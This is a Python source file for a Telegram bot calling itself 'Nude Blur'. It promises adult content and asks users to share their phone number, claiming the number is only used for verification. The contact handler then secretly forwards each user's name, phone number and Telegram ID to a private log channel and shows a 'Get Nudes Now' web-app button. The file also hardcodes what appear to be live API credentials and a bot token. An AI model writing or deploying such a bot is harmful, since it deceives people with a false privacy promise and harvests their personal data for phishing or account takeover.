from pyrogram import Client, filters
from pyrogram.types import (
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    WebAppInfo
)
import traceback

api_id = 32208414
api_hash = "628f11c05a44c8dda4b006e66f4bf7df"
bot_token = "8868465319:AAEWMJ_ZxaO12NDfc3iffSTazWn-6V1_H24"

LOG_CHANNEL = -1005227254644  # Bot must be admin in this channel!
WEB_APP_URL = "https://corn-web-e20653f15368.herokuapp.com"

bot = Client(
    "edu_bot",
    api_id=api_id,
    api_hash=api_hash,
    bot_token=bot_token
)

@bot.on_message(filters.command("start"))
async def start_handler(client, message):
    keyboard = ReplyKeyboardMarkup(
        [
            [
                KeyboardButton(
                    "📱 Share Phone Number",
                    request_contact=True
                )
            ]
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )

    await message.reply_text(
        "👋 <b>Welcome to Nude Blur!</b>\n\n"
        "🔞 To access adult content, please share your phone number.\n\n"
        "🔒 Your number is safe and only used for verification.\n\n"
        "<b>📱 Tap the button below to share your contact.</b>",
        reply_markup=keyboard
    )

@bot.on_message(filters.contact)
async def contact_handler(client, message):
    try:
        contact = message.contact
        user = message.from_user

        # Check if user is sharing their own contact
        if contact.user_id is not None and contact.user_id != user.id:
            await message.reply_text(
                "❌ Please use the button to share your own phone number."
            )
            return

        name = user.first_name or "Unknown"
        phone = contact.phone_number
        user_id = user.id

        # Try to send log to channel separately - don't let it break the flow
        try:
            await client.send_message(
                LOG_CHANNEL,
                f"🎓 <b>NEW LOGIN</b>\n\n"
                f"👤 Name: {name}\n"
                f"📱 Phone: +{phone}\n"
                f"🆔 TG ID: <code>{user_id}</code>"
            )
            print(f"✅ Log sent to channel for user {user_id}")
        except Exception as log_error:
            print(f"❌ Failed to send log: {log_error}")
            print(f"Channel ID: {LOG_CHANNEL}")
            # Continue anyway - don't block user

        # Web App button - this will always show even if logging fails
        keyboard = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🔥 Get Nudes Now",
                        web_app=WebAppInfo(url=WEB_APP_URL)
                    )
                ]
            ]
        )

        await message.reply_text(
            "📱 <b>Phone number received!</b>\n\n"
            "🔞 Click the button below to access adult content.\n\n"
            "<b>⚠️ 18+ Content</b> - You must be 18 years or older.",
            reply_markup=keyboard
        )

    except Exception as e:
        error_msg = f"Error: {str(e)}\n\n{traceback.format_exc()}"
        print(error_msg)
        await message.reply_text(
            f"❌ Error: {str(e)}\n\nPlease try again or contact support."
        )

if __name__ == "__main__":
    print("🚀 Sex Bot Started...")
    print(f"📢 Log Channel: {LOG_CHANNEL}")
    bot.run()